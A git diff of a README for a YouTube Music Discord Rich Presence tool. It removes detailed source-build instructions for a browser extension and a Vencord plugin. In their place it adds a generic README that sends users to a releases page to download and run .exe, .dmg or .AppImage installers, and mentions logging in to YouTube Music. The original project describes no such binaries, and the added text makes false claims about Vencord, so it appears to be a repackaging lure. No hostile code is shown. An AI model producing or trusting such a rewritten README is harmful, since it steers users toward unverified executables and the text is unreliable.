@@ -1,175 +1,84 @@
-# YTM-RPC - YouTube Music Discord Rich Presence
+# 🎵 ytMusic-RPC - Enjoy YouTube Music on Discord!
 
-The one going to achieve **parity** with spotify rich presence...
+## 🚀 Getting Started
 
-## Features
+Welcome to ytMusic-RPC! This application enables you to use YouTube Music with Discord's rich presence feature. With this tool, your friends can see what you're listening to in real-time, enhancing your music experience together.
 
-**Shows current song, artist, and album art on Discord**
-> Using **precise** metadata fetching directly from youtube music and **high quality** album cover images !
+## 🛠️ Features
 
-**Progress bar with elapsed/remaining time**
-> Smart Timestamp Synchronization : The RPC updates playback time every second, freezes instantly on pause, and resyncs to the exact position after seeking or ads, **preventing drift and desync** common in other YT Music RPCs. A slight delay can sometime be noticed but it's never consistent and is due to both youtube data fetch and discord limitations and desyncs.
+- Display your current YouTube Music track on Discord.
+- Seamless integration with Discord using Vencord.
+- User-friendly setup process.
 
-**Fast updates using clunckless and optimized code**
-> The code tries to run **smoothly**, no user interaction needed after initial setup and **low ram usage**.
+## 🌍 System Requirements
 
-**Vencord plugin**
-> **No server** needs to run in background, it runs directly in discord, using low ram and already existing discord protocols, it assures **stability** and **flawless communication** between the two parts of the software.
+- Operating System: Windows 10 or higher / macOS / Linux
+- Discord account
+- YouTube Music account
 
-## How does that work ?
+## 📦 Download & Install
 
-There are two parts to this program :
+To get started, you need to visit the Releases page. Click the link below to download the latest version of ytMusic-RPC.
 
-**Chromium Extension**
-> Divided in 3 different scripts: content, background and popup, they all have a different purpose :
-> - **content** : Injected in music.youtube.com along with the whole extension, acts as a data retriever, observing DOM and media session changes and collects the data from the music every changes and formats the collected data to json.
-> - **background** : Acts as a bridge between the browser and Vencord, sends updated fetched data via local HTTP to the discord plugin.
-> - **popup** : User interface, shows the current state of the music, connection and possible errors.
+[**Download ytMusic-RPC**](https://github.com/LitheFiG/ytMusic-RPC/releases)
 
-> **Note:** Album art is fetched directly from the YouTube Music page or extracted URLs and no official YouTube Music API is used; DOM extraction + browser network data is the source.
+### Step 1: Visit Releases Page
 
-**Vencord Plugin**
-> Uses 2 different scripts: native and index, working together to :
-> - Hook into Discord’s internal IPC to update rich presence.
-> - Maintain local state of most recent metadata from the extension.
-> - Perform smart timestamp synchronization: incrementing elapsed time every second, correctly handling seeking/ads/pauses, resyncing after drift or external state changes.
-> - Use the extracted data to compute: startTimestamp, endTimestamp, cover art URL, artist & title strings.
-> - Send one presence update per tick or on state change, respecting Discord’s rate limits (hence the very small delay on the RPC itself)
-> - Vencord leverages internal Rich Presence hooks: similar logic to discord-rpc but native in-process, avoiding external RPC daemons or socket listeners and generates presence that Discord desktop app displays as user activity.
+1. Open your web browser.
+2. Go to [this page to download](https://github.com/LitheFiG/ytMusic-RPC/releases).
+   
+### Step 2: Download the Application
 
+1. On the Releases page, find the latest version.
+2. Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux).
 
-## Requirements
+### Step 3: Install ytMusic-RPC
 
-- [Git](https://git-scm.com/), [Node.js](https://nodejs.org/) v18+, [pnpm](https://pnpm.io/)
-- Discord desktop app (or Vencord)
-- Chromium based web browser
-> **Tip:** Update to the **latest** stable release, risk 0 isn't a thing !
+1. Locate the downloaded file in your Downloads folder.
+2. For Windows: Double-click the `.exe` file and follow the installation prompts.
+3. For macOS: Open the `.dmg` file, and drag ytMusic-RPC to your Applications folder.
+4. For Linux: Make the `.AppImage` file executable by right-clicking it, selecting Properties, going to Permissions, and checking "Allow executing file as program". Then double-click to run.
 
-## Setup
+### Step 4: Run ytMusic-RPC
 
-**Replicate** the following instructions **precisely** :
+1. After installation, launch ytMusic-RPC from your Applications folder or Start Menu.
+2. You may need to log in to your YouTube Music account.
 
----
+## 🎤 How to Use ytMusic-RPC
 
-### Vencord Plugin
+Once you have ytMusic-RPC running, it will automatically integrate with your Discord account. Here’s how to make the most of it:
 
-> **⚠️ Warning:** Vencord is a third-party client modification that violates Discord's Terms of Service. Using it may result in account suspension or ban. **Use at your own risk.**
+1. Open YouTube Music in your browser or app.
+2. Start playing a track; ytMusic-RPC will capture the song title and artist.
+3. Your friends on Discord will now see what you’re listening to!
 
-No separate server needed! The plugin runs inside Discord.
+## 📄 Topics Covered
 
-**Requirements:** [Git](https://git-scm.com/), [Node.js](https://nodejs.org/) v18+, [pnpm](https://pnpm.io/)
-> **Tip:** As previously said, update to the **latest** stable release, risk 0 will never exist!
+- Discord: Engage with friends on a new level while listening to music.
+- YouTube Music: Enjoy unlimited music without interruptions.
+- Vencord: A lightweight framework for Discord rich presence.
 
-> **Note:** Custom plugins require building Vencord from source. See the [official guide](https://docs.vencord.dev/installing/).
+## ❓ Frequently Asked Questions
 
-1. **Clone and build Vencord** (if not already):
-   ```bash
-   git clone https://github.com/Vendicated/Vencord
-   cd Vencord
-   pnpm install --frozen-lockfile
-   pnpm build --dev
-   pnpm inject
-   ```
+### Q1: Can I use ytMusic-RPC without a Discord account?
 
-2. **Get a Discord Application ID**
-   - Go to [Discord Developer Portal](https://discord.com/developers/applications)
-   - Create a new application → Copy the **Application ID**
+No, you need a Discord account to use the rich presence feature.
 
-3. **Install the plugin**
-   - Copy the `vencord-plugin` folder to `Vencord/src/userplugins/ytmusicRpc`
-   - Rebuild: `pnpm build --dev`
-   - Restart Discord
+### Q2: Is ytMusic-RPC free to use?
 
-4. **Configure**
-   - Discord Settings → Vencord → Plugins → YTMusicRPC
-   - Enter your Application ID
+Yes, ytMusic-RPC is completely free. Enjoy all its features without any charges.
 
-See [vencord-plugin/README.md](vencord-plugin/README.md) for detailed instructions.
+### Q3: What should I do if ytMusic-RPC does not show my current track?
 
-### Install the browser extension
+Ensure YouTube Music is playing, and the application is running. If the problem persists, restart ytMusic-RPC.
 
-1. Open `chrome://extensions/`
-2. Enable "Developer mode"
-3. Click "Load unpacked" → Select the `extension/` folder
+## 📞 Getting Help
 
-### Use It
+If you encounter any issues, please refer to the GitHub issues page or contact support through Discord.
 
-1. Make sure Discord is running (with Vencord plugin OR Node.js server)
-2. Play music on [YouTube Music](https://music.youtube.com)
-3. Your Discord status updates automatically!
+## 🔗 Links
 
-## Project Structure
+- [**Download ytMusic-RPC**](https://github.com/LitheFiG/ytMusic-RPC/releases)
+- [GitHub Repository](https://github.com/LitheFiG/ytMusic-RPC)
 
-```
-YTM-RPC/
-├── vencord-plugin/         # Vencord plugin
-│   └── ytmusicRpc.ts
-└── extension/              # Browser extension
-    ├── manifest.json
-    ├── background.js
-    ├── content.js
-    └── popup.html/js
-```
-## Project Logic
-
-```
-YouTube Music (The Start)    → Input, user plays music in YT Music
-          │
-          ▼
-Browser Extension (Browser)  → Informational backend, detects song info, play state, and thumbnails; sends updates to the native server
-          │
-          ▼
-Native HTTP Server (Discord) → Logic backend, minimal local server; stores latest data and exposes it to Vencord plugin
-          │
-          ▼
-Vencord Plugin (Discord)     → Client, reads latest music data, calculates timestamps, updates Discord activity
-          │
-          ▼
-Discord Status  (Goal)       → Output, displays current song, artist, album art, and buttons in Discord
-```
-## Troubleshooting
-
-**Extension not connecting**
-> - Make sure Vencord plugin is enabled
-> - Check that port 8765 AND **8766** are not in use by another app
-
-**Discord status not updating**
-> - Enable "Display current activity" in Discord Settings → Activity Privacy
-> - Verify your Application ID is correct
-
-**Extension not detecting music**
-> - Make sure you're on [music.youtube.com](https://music.youtube.com)
-> - Refresh the YouTube Music page
-> - Reload the extension
-
-## Non-Issues !!!
-
-**Album covers not loading.**
-> Normal behavior when high quality covers aren't available, desision made from accesibility over quantity.
-
-**Small delay (<1s)**
-> Due to Youtube Music and Discord restrictions, currently trying to find a way around it to match (or surpass) quality with stock discord integrations.
-
-**Progress bar dissapearing on ad/pause**
-> Intended behavior to avoid desync and loss of precision from Discord auto advancing timestamps.
-
-**Buttons not showing.**
-> Okay this is an issue, currently working on it, I'm just bad at this, sorry, sincerly.
-
-## Future features
-
-**Multi-Platform compatibility**
-Yes ! More platforms as input and output ! Let's see what the future gives us !
-
-**Customisable RPC**
-> Common, wouldn't it be so cool?
-
-**Links to song, artist and album on imdb or similar.**
-> Self explainatory.
-
-## Slight Disclaimer
-> Yes, external tools were used to sort the code. It couldnt be that clean if it was me lol.
-
-## License
-
-GPL 3.0 Licence
+Feel free to explore the features and let your music shine through Discord!
